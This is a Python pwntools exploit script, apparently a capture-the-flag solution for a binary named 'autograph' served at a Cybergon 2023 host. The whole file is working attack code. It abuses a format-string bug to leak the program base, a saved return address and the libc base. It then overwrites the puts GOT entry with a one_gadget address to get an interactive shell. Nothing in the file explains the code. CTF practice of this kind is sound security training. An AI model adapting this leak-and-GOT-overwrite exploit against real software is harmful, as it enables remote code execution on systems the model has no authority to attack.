#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./autograph")
libc = ELF("./libc6_2.35-0ubuntu3.3_amd64.so")


def start(argv=[], *a, **kw):
    nc = "nc cybergon2023.webhop.me 5001"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}


def exec_fmt(payload):
    io = start()
    io.sendlineafter(b"choice: ", b"9")
    io.sendlineafter(b"notes: \n", payload)
    return io.recvall(timeout=1)


# fmt = FmtStr(execute_fmt=exec_fmt, offset=6)

offset = 6


def aaw(addr, data):
    payload = fmtstr_payload(offset, {addr: data})
    io.sendlineafter(b"choice: ", b"9")
    io.sendlineafter(b"notes: \n", payload)


def fmt_leak(offset):
    io.sendlineafter(b"choice: ", b"9")
    io.sendlineafter(b"notes: \n", f"%{offset}$lx".encode())
    io.recvline()
    return int(io.recvline(keepends=False), 16)


io = start()
elf.address = fmt_leak(0x22) - 0x141f
saved_rip = fmt_leak(0x20) + 0x8
libc_start_main_ret = fmt_leak(0x2f)
log.info(f"{elf.address=:#x}")
libc.address = libc_start_main_ret - 0x29d90
assert libc.address & 0xfff == 0
log.info(f"{libc.address=:#x}")

one_gadget = libc.address + 0xebcf5

aaw(elf.got["puts"], one_gadget)

# for i in range(0x20, 0x50):
#     r = fmt_leak(i)
#     log.info(f"{i:02x} {r:#x}")

io.interactive()
